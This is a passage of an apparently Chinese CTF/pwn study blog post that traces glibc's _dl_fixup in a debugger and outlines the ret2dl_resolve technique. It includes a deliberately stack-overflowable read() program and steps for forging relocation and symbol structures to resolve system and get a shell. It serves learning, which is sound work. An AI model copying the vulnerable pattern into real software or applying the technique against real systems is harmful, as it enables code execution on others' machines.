[r8]<br>; r8 包含地址link_map， l_addr指向libc基地址<br><br><br>0x7ffff7fe2b1f &lt;_dl_fixup+255&gt;    add    rax, QWORD PTR [rdx + 8]<br>;rdx 指向libc中结构体Elf64_Symlibc<br><br>; R8   0x7ffff7fae000 --&gt; 0x7ffff7deb000 &lt;-- 0x3010102464c457f<br>; RDX  0x7ffff7df7cd0<br><br><br>; call _dl_lookup_symbol_x后<br>; rax中存放libc基地址，rax += $rdx+8<br>; rdx+8 指向 是Elf64_Sym结构体中st_value的地址<br>; rax + $rdx+8 == libc_base+ st_value<br><br>;获得read在libc中的地址<br></code></pre></td></tr></table></figure></li><li><p><code>value = elf_machine_plt_value (l, reloc, value);</code></p><p><strong>调用3：elf_machine_plt_value</strong></p><p>在其上两次调用结束后，我们可以获取到函数在libc中的地址</p><p>通过<code>elf_machine_fixup_plt()</code>，可以将解析符号的地址写入<code>rel_addr</code>指向的位置</p></li></ol><h3 id="回顾-amp-总结"><a href="#回顾-amp-总结" class="headerlink" title="回顾&amp;总结"></a>回顾&amp;总结</h3><ol><li><p>调用<code>_dl_fixup(link_map, reloc_arg)</code></p></li><li><p><code>const PLTREL *const reloc = (const void *) (JMPREL + reloc_offset);</code></p><p><code>_dl_fixup()</code>，根据<code>reloc_offset (reloc_arg * 0x18)</code>的值，在.rela.plt 中寻找对应的<code>Elf64_Rel</code>结构体。</p></li><li><p><code>const ElfW(Sym) *sym = &amp;symtab[reloc-&gt;r_info &gt;&gt; 32];</code></p><p>它使用 <code>Elf64_Rel</code>结构体中的字段<code>reloc-&gt;r_info &gt;&gt; 32</code>作为索引，在SYMTAB 节中找到相应的<code>Elf64_Sym</code> 结构</p></li><li><p><code>assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</code></p><p>使用<code>Elf64_Rel</code>结构中<code>r_info</code>，确保它是一个有效的 JUMP_SLOT。</p></li><li><p><code>if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</code></p><p>使用<code>Elf64_Sym</code>结构中<code>st_other</code>，以确保符号未被解析。</p><p> <code>(sym-&gt;st_other &amp; 3) != 0</code>意思是“符号已经解析”，所以我们需要<code>st_other</code>&#x3D;&#x3D; 0。</p></li><li><p><code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code></p><p>执行符号版本控制检查。</p><p>通常满足此检查，因此它通过<code>ElfW(Half) ndx = vernum[reloc-&gt;r_info &gt;&gt; 32] &amp; 0x7fff;</code>计算“ndx”  </p><p>然后获取版本号 <code>version = &amp;l-&gt;l_versions[ndx];</code>。</p></li><li><p><code>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);</code></p><p><code>_dl_lookup_symbol_x()</code>函数, 通过<code>strtab + sym-&gt;st_name</code>，在加载对象的符号表中查找符号的定义并返回 <code>link_map</code>地址。<code>l_addr</code>指向 libc 基地址。</p></li><li><p><code>value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</code></p><p><code>DL_FIXUP_MAKE_VALUE()</code>从库基地址找到函数的偏移量并重定位</p></li><li><p><code>return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</code></p><p><code>elf_machine_fixup_plt()</code>将已解析符号的地址写入<code>rel_addr</code>（In the GOT）指向的位置。</p></li></ol><h2 id="调试read流程"><a href="#调试read流程" class="headerlink" title="调试read流程"></a>调试read流程</h2><p><strong>理解_dl_fixup</strong></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><p>前提可以修改got表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">20</span>];<br>    read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x90</span>);<br>&#125;<br><br><span class="hljs-comment">//gcc poc.c -o poc -no-pie</span><br></code></pre></td></tr></table></figure><ol><li><p><strong>plt表</strong></p><p><strong>第一次调用read函数</strong></p><p>从plt表，找函数存根，没有，则指向默认存根</p><p><strong>push link_map</strong></p><p><strong>jmp  _dl_runtime_reslove</strong></p><p><img src="/../md/1.png"></p></li><li><p><strong>执行_dl_runtime_reslove函数</strong></p><p><img src="/../md/2.png"></p><p>最后一句汇编，执行_dl_fixup函数</p><p>跟进去，继续看</p></li><li><p><strong>_dl_fixup</strong></p><p><img src="/../md/3.png"></p><p>已经接受了参数link_map和reloc_arg，存放在rdi和rsi中</p></li></ol><h3 id="源码级调试"><a href="#源码级调试" class="headerlink" title="源码级调试"></a><strong>源码级调试</strong></h3><p><strong>跳过定义部分，重点关注check以及后续函数的调用导致寄存器中值的变化</strong></p><p><strong>check1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>RSI  0x200000007<br><br> ► 0x7ffff7fe0b32 &lt;_dl_fixup+82&gt;     cmp    esi, 7<br>   0x7ffff7fe0b35 &lt;_dl_fixup+85&gt;     jne    _dl_fixup+414                &lt;_dl_fixup+414&gt;<br><br>; (reloc-&gt;r_info &amp; 0xffffffff) == 0x7<br></code></pre></td></tr></table></figure><p><strong>check2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<br><br>RDX  0x3ff3e8 ◂— 0x120000001c<br><br> ► 0x7ffff7fe0b3b &lt;_dl_fixup+91&gt;     test   byte ptr [rdx + 5], 3<br>   0x7ffff7fe0b3f &lt;_dl_fixup+95&gt;     jne    _dl_fixup+320                &lt;_dl_fixup+320&gt;<br><br><br>pwndbg&gt; x /20xg 0x3ff3e8+5<br>0x3ff3ed:0x00000000000000000x0000000000000000<br><br>; test结果为0，jne需要标志位不为0，才跳转<br>; 不进行跳转,继续执行if语句内的内容<br></code></pre></td></tr></table></figure><p><strong>check3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)<br><br>R10  0x7ffff7ffe1f0 ◂— 0x0<br><br>► 0x7ffff7fe0b45 &lt;_dl_fixup+101&gt;    mov    r8, qword ptr [r10 + 0x1d0]<br>   0x7ffff7fe0b4c &lt;_dl_fixup+108&gt;    test   r8, r8<br>   0x7ffff7fe0b4f &lt;_dl_fixup+111&gt;    je     _dl_fixup+157                &lt;_dl_fixup+157&gt;<br><br>pwndbg&gt; x /20xg 0x7ffff7ffe1f0+0x1d0<br>0x7ffff7ffe3c0:0x0000000000403f800x0000000000000000<br><br>pwndbg&gt; x /20xg 0x0000000000403f80<br>0x403f80:0x000000006ffffff00x0000000000400490<br><br><br>*R8   0x403f80 (_DYNAMIC+352) ◂— 0x6ffffff0<br> ► 0x7ffff7fe0b4c &lt;_dl_fixup+108&gt;    test   r8, r8<br> <br>; test结果不为0，je需要标志位为0,才跳转<br>; 不跳转，继续执行if语句<br><br></code></pre></td></tr></table></figure><p>之后是获取版本号，跳过</p><p><strong>调用1</strong></p><p>在加载的对象中寻找符号定义，</p><p>函数会返回link_map结构体地址，其第一个元素有libc_base(0x7ffff7e04000)</p><p>返回l_addr</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> ► 0x7ffff7fe0bb2 &lt;_dl_fixup+210&gt;    call   _dl_lookup_symbol_x                &lt;_dl_lookup_symbol_x&gt;<br>        rdi: 0x3fe3a4 ◂— 0x6c5f5f0064616572 /* &#x27;read&#x27; */<br>        rsi: 0x7ffff7ffe1f0 ◂— 0x0<br>        rdx: 0x7fffffffdb28 —▸ 0x3ff3e8 ◂— 0x120000001c<br>        rcx: 0x7ffff7ffe558 —▸ 0x7ffff7ffe4b0 —▸ 0x7ffff7fc9590 —▸ 0x7ffff7ffe1f0 ◂— 0x0<br>        r8: 0x7ffff7fc95f8 —▸ 0x3fe3bb ◂— &#x27;GLIBC_2.2.5&#x27;<br>        r9: 0x1<br>        arg[6]: 0x1<br>        arg[7]: 0x0<br><br><br>; 执行完函数的寄存器状态<br>*RAX  0x7ffff7fc9000 —▸ 0x7ffff7e04000 ◂— 0x3010102464c457f<br>*RBX  0x404020 (read@got.plt) —▸ 0x401040 ◂— endbr64 <br> RCX  0x1<br> RDX  0x6<br> RDI  0x7ffff7e1f8e9 ◂— 0x4700352e322e325f /* &#x27;_2.2.5&#x27; */<br> RSI  0x3fe3c0 ◂— 0x4700352e322e325f /* &#x27;_2.2.5&#x27; */<br>*R8   0x7ffff7fc9000 —▸ 0x7ffff7e04000 ◂— 0x3010102464c457f<br> R9   0x7ffff7e10fe8 ◂— 0x100012000021b7<br> R10  0xfffffffffffff8f9<br> R11  0x7fffffffdb28 —▸ 0x7ffff7e10fe8 ◂— 0x100012000021b7<br>*R12  0x401070 (_start) ◂— endbr64 <br>*R13  0x7fffffffe040 ◂— 0x1<br>*R14  0x0<br>*R15  0x0<br>*RBP  0x7fffffffdf50 ◂— 0x0<br>*RSP  0x7fffffffdb10 ◂— 0x1<br>*RIP  0x7ffff7fe0bba (_dl_fixup+218) ◂— mov    eax, dword ptr fs:[0x18]<br><br></code></pre></td></tr></table></figure><p><strong>调用2</strong></p><p>通过<code> SYMBOL_ADDRESS</code>宏，<code>DL_FIXUP_MAKE_VALUE</code>寻找库函数的偏移，重定位并将结果存储在<code>value</code>变量中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">value = DL_FIXUP_MAKE_VALUE (result,  SYMBOL_ADDRESS (result, sym, false));<br><br><br><br>pwndbg&gt; <br>elf_machine_fixup_plt (map=&lt;optimized out&gt;, t=&lt;optimized out&gt;, refsym=&lt;optimized out&gt;, sym=0x7ffff7e10fe8, reloc=&lt;optimized out&gt;, value=140737353032400, reloc_addr=0x404020 &lt;read@got.plt&gt;) at ../sysdeps/x86_64/dl-machine.h:242<br><br>242  return *reloc_addr = value;<br><br></code></pre></td></tr></table></figure><p><strong>调用3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs assembly">value = elf_machine_plt_value (l, reloc, value);<br><br> RAX  0x0<br> RBX  0x404020 (read@got.plt) —▸ 0x401040 ◂— endbr64 <br> RCX  0x1<br> RDX  0x7ffff7e10fe8 ◂— 0x100012000021b7<br> RDI  0x7ffff7e1f8e9 ◂— 0x4700352e322e325f /* &#x27;_2.2.5&#x27; */<br> RSI  0x0<br> R8   0x7ffff7fc9000 —▸ 0x7ffff7e04000 ◂— 0x3010102464c457f<br> R9   0x7ffff7e10fe8 ◂— 0x100012000021b7<br> R10  0xfffffffffffff8f9<br> R11  0x7fffffffdb28 —▸ 0x7ffff7e10fe8 ◂— 0x100012000021b7<br> R12  0x401070 (_start) ◂— endbr64 <br> R13  0x7fffffffe040 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdf50 ◂— 0x0<br> RSP  0x7fffffffdb20 ◂— 0x0<br>*RIP  0x7ffff7fe0be0 (_dl_fixup+256) ◂— mov    rax, qword ptr [r8]<br><br><br>► 0x7ffff7fe0be0 &lt;_dl_fixup+256&gt;    mov    rax, qword ptr [r8]<br><br>   0x7ffff7fe0be3 &lt;_dl_fixup+259&gt;    add    rax, qword ptr [rdx + 8]<br>   <br>   0x7ffff7fe0be7 &lt;_dl_fixup+263&gt;    movzx  edx, byte ptr [rdx + 4]<br>   0x7ffff7fe0beb &lt;_dl_fixup+267&gt;    and    edx, 0xf<br>   0x7ffff7fe0bee &lt;_dl_fixup+270&gt;    cmp    dl, 0xa<br>   0x7ffff7fe0bf1 &lt;_dl_fixup+273&gt;    je     _dl_fixup+312                &lt;_dl_fixup+312&gt;<br>; R8   0x7ffff7fc9000 —▸ 0x7ffff7e04000 ◂— 0x3010102464c457f<br>; RDX  0x7ffff7e10fe8 ◂— 0x100012000021b7<br>; R8:link_map地址， l_addr指向libc基地址<br>; rdx 指向libc中结构体Elf64_Symlibc<br><br>执行后<br>; *RAX  0x7ffff7e04000 ◂— 0x3010102464c457f<br><br>再次执行<br>; *RAX  0x7ffff7ef22d0 (read) ◂— endbr64<br><br><br>; rax中存放libc基地址，rax += $rdx+8<br>; rdx+8 指向 是Elf64_Sym结构体中st_value的地址<br>; rax + $rdx+8 == libc_base+ st_value<br><br>;获得read在libc中的地址<br></code></pre></td></tr></table></figure><p><strong>调用2的末尾</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br><br> RAX  0x7ffff7ef22d0 (read) ◂— endbr64 <br>*RBX  0x7fffffffdf10 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64 <br> RCX  0x1<br> RDX  0x0<br> RDI  0x7ffff7e1f8e9 ◂— 0x4700352e322e325f /* &#x27;_2.2.5&#x27; */<br> RSI  0x0<br> R8   0x7ffff7fc9000 —▸ 0x7ffff7e04000 ◂— 0x3010102464c457f<br> R9   0x7ffff7e10fe8 ◂— 0x100012000021b7<br> R10  0xfffffffffffff8f9<br> R11  0x7fffffffdb28 —▸ 0x7ffff7e10fe8 ◂— 0x100012000021b7<br> R12  0x401070 (_start) ◂— endbr64 <br> R13  0x7fffffffe040 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdf50 ◂— 0x0<br>*RSP  0x7fffffffdb38 —▸ 0x7ffff7fe816e (_dl_runtime_resolve_xsavec+126) ◂— mov    r11, rax<br>*RIP  0x7ffff7fe0c05 (_dl_fixup+293) ◂— ret    <br></code></pre></td></tr></table></figure><p><strong>结束_dl_fixup调用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br># Copy args pushed by PLT in <span class="hljs-keyword">register</span>.<br># %rdi: link_map, %rsi: reloc_index<br><span class="hljs-title function_">mov</span> <span class="hljs-params">(LOCAL_STORAGE_AREA + <span class="hljs-number">8</span>)</span><span class="hljs-params">(%BASE)</span>, %RSI_LP<br>mov <span class="hljs-title function_">LOCAL_STORAGE_AREA</span><span class="hljs-params">(%BASE)</span>, %RDI_LP<br>call _dl_fixup# Call resolver. <span class="hljs-comment">//结束_dl_fixup</span><br>        <br>mov %RAX_LP, %R11_LP# Save <span class="hljs-keyword">return</span> value <span class="hljs-comment">//read地址存放在r11上</span><br># Get <span class="hljs-keyword">register</span> content back.<br>        <br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> USE_FXSAVE</span><br>fxrstor <span class="hljs-title function_">STATE_SAVE_OFFSET</span><span class="hljs-params">(%rsp)</span> <span class="hljs-comment">//跳过了</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>movl $STATE_SAVE_MASK, %eax  <span class="hljs-comment">//此处开始，保存寄存器状态</span><br>xorl %edx, %edx<br>xrstor <span class="hljs-title function_">STATE_SAVE_OFFSET</span><span class="hljs-params">(%rsp)</span> <br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>movq <span class="hljs-title function_">REGISTER_SAVE_R9</span><span class="hljs-params">(%rsp)</span>, %r9<br>movq <span class="hljs-title function_">REGISTER_SAVE_R8</span><span class="hljs-params">(%rsp)</span>, %r8<br>movq <span class="hljs-title function_">REGISTER_SAVE_RDI</span><span class="hljs-params">(%rsp)</span>, %rdi<br>movq <span class="hljs-title function_">REGISTER_SAVE_RSI</span><span class="hljs-params">(%rsp)</span>, %rsi<br>movq <span class="hljs-title function_">REGISTER_SAVE_RDX</span><span class="hljs-params">(%rsp)</span>, %rdx<br>movq <span class="hljs-title function_">REGISTER_SAVE_RCX</span><span class="hljs-params">(%rsp)</span>, %rcx<br>movq <span class="hljs-title function_">REGISTER_SAVE_RAX</span><span class="hljs-params">(%rsp)</span>, %rax<br>        <br><span class="hljs-meta"># <span class="hljs-keyword">if</span> DL_RUNTIME_RESOLVE_REALIGN_STACK</span><br>mov %RBX_LP, %RSP_LP<br><span class="hljs-title function_">cfi_def_cfa_register</span><span class="hljs-params">(%rsp)</span><br><span class="hljs-title function_">movq</span> <span class="hljs-params">(%rsp)</span>, %rbx<br><span class="hljs-title function_">cfi_restore</span><span class="hljs-params">(%rbx)</span><br>        <br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br># Adjust <span class="hljs-title function_">stack</span><span class="hljs-params">(PLT did <span class="hljs-number">2</span> pushes)</span><br> add $<span class="hljs-params">(LOCAL_STORAGE_AREA + <span class="hljs-number">16</span>)</span>, %RSP_LP<br> <span class="hljs-title function_">cfi_adjust_cfa_offset</span><span class="hljs-params">(-(LOCAL_STORAGE_AREA + <span class="hljs-number">16</span>))</span>   <br># Preserve bound registers.<br>PRESERVE_BND_REGS_PREFIX<br><br>jmp *%r11# Jump to function address.<br></code></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x7ffff7fe816e &lt;_dl_runtime_resolve_xsavec+126&gt;    mov    r11, rax                      &lt;read&gt;<br>   0x7ffff7fe8171 &lt;_dl_runtime_resolve_xsavec+129&gt;    mov    eax, 0xee<br>   0x7ffff7fe8176 &lt;_dl_runtime_resolve_xsavec+134&gt;    xor    edx, edx<br>   0x7ffff7fe8178 &lt;_dl_runtime_resolve_xsavec+136&gt;    xrstor ptr [rsp + 0x40]<br>   <br>   0x7ffff7fe817d &lt;_dl_runtime_resolve_xsavec+141&gt;    mov    r9, qword ptr [rsp + 0x30]<br>   0x7ffff7fe8182 &lt;_dl_runtime_resolve_xsavec+146&gt;    mov    r8, qword ptr [rsp + 0x28]<br>   0x7ffff7fe8187 &lt;_dl_runtime_resolve_xsavec+151&gt;    mov    rdi, qword ptr [rsp + 0x20]<br>   0x7ffff7fe818c &lt;_dl_runtime_resolve_xsavec+156&gt;    mov    rsi, qword ptr [rsp + 0x18]<br>   0x7ffff7fe8191 &lt;_dl_runtime_resolve_xsavec+161&gt;    mov    rdx, qword ptr [rsp + 0x10]<br>   0x7ffff7fe8196 &lt;_dl_runtime_resolve_xsavec+166&gt;    mov    rcx, qword ptr [rsp + 8]<br>   0x7ffff7fe819b &lt;_dl_runtime_resolve_xsavec+171&gt;    mov    rax, qword ptr [rsp]<br><br>   0x7ffff7fe819f &lt;_dl_runtime_resolve_xsavec+175&gt;    mov    rsp, rbx<br>   0x7ffff7fe81a2 &lt;_dl_runtime_resolve_xsavec+178&gt;    mov    rbx, qword ptr [rsp]<br>   0x7ffff7fe81a6 &lt;_dl_runtime_resolve_xsavec+182&gt;    add    rsp, 0x18<br>   <br>►  0x7ffff7fe81aa &lt;_dl_runtime_resolve_xsavec+186&gt;    bnd jmp r11<br>   <br>   <br>; 寄存器状态<br> RAX  0x7fffffffdf30 ◂— 0x0<br> RBX  0x4011a0 (__libc_csu_init) ◂— endbr64 <br> RCX  0x7ffff7fc2738 (__exit_funcs) —▸ 0x7ffff7fc49a0 (initial) ◂— 0x0<br> RDX  0x90<br> RDI  0x0<br> RSI  0x7fffffffdf30 ◂— 0x0<br> R8   0x0<br> R9   0x7ffff7fe1730 (_dl_fini) ◂— endbr64 <br> R10  0xfffffffffffff8f9<br> R11  0x7ffff7ef22d0 (read) ◂— endbr64 <br> R12  0x401070 (_start) ◂— endbr64 <br> R13  0x7fffffffe040 ◂— 0x1<br> R14  0x0<br> R15  0x0<br> RBP  0x7fffffffdf50 ◂— 0x0<br>*RSP  0x7fffffffdf28 —▸ 0x401187 (main+49) ◂— nop    <br>*RIP  0x7ffff7fe81aa (_dl_runtime_resolve_xsavec+186) ◂— bnd jmp r11<br></code></pre></td></tr></table></figure><p><strong>调了一遍，还是很难懂利用的流程，如何进行伪造，如何控制</strong></p><p><strong>后面跟模板，跟思路，调一下进行伪造的_dl_fixup</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p><strong>如果bss映射在0x40XXXX，则可以通过下面的思路，伪造reloc_arg进行攻击</strong></p><ol><li><p>在堆栈上压入一个大的伪造<code>reloc_arg</code>，然后跳转到 plt 默认存根。<code>_dl_fixup()</code>将<code>link_map</code>与<code>fake_reloc_arg</code>一起被称<code>aguments</code>。</p><p>这样我们就可以控制 <code>const PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</code> 指向一个可控区域（bss&#x2F;heap）。</p></li><li><p>在<code>fake_JMPREL</code> 部分，我们创建了一个<code>fake_Elf64_Rel</code>具有大<code>fake_r_info</code>。</p><p>现在我们也可以控制 <code>const ElfW(Sym) *sym = &amp;symtab[reloc-&gt;r_info &gt;&gt; 32]</code> 指向可控区域。</p></li><li><p>创建<code>fake_r_info</code>字段，我们需要确保它以 0x7 结尾</p><p>通过校验： <code>assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</code></p></li><li><p>在 <code>fake_DYNSYM</code> 部分，我们创建一个<code>fake_Elf64_Sym</code>结构，<code>fake_st_other</code>字段设置为 0x00。</p><p>通过校验： <code>if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</code> </p></li><li><p>在相同的<code>Elf64_Sym</code>结构中，我们创建了一个大<code>fake_st_name</code> 字段。</p><p>可以控制 <code>strtab + sym-&gt;st_name</code>指向可控区域。</p></li><li><p>在<code>fake_STRTAB </code>部分中，我们编写了一个以空字符结尾的字符串，例如 <code>system\x00</code>。</p><p>如果我们计算正确， <code>dl_fixup()</code>将解析符号，我们将get_shell</p></li></ol><h3 id="⭐对于x64"><a href="#⭐对于x64" class="headerlink" title="⭐对于x64"></a>⭐<strong>对于x64</strong></h3><p><strong>如果bss映射在0x60XXXX，则会出现崩溃</strong></p><p>64位程序构造的数据一般都是在bss段，如<code>0x601000-0x602000</code>,导致其相对于<code>.dynsym</code>的地址<code>0x400000-0x401000</code>很大，使得<code>reloc-&gt;r_info</code>也很大，最后使</p><p>得访问<code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code>时程序访存出错，导致程序崩溃。</p><p>如果要按照上面的流程，要使<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL</code>不成立来避免崩溃，但是这样做的前提是泄露，而如果能泄露，则不需要</p><p>ret2dl_reslove手法，其他的方法或许更简单</p><p><strong>改变思路，使<code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code>，sym-&gt;st_other !&#x3D; 0，从而绕过上面的check3检测</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup (<span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br><br>  <span class="hljs-comment">//获取符号表地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab= (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-comment">//获取字符串表地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> 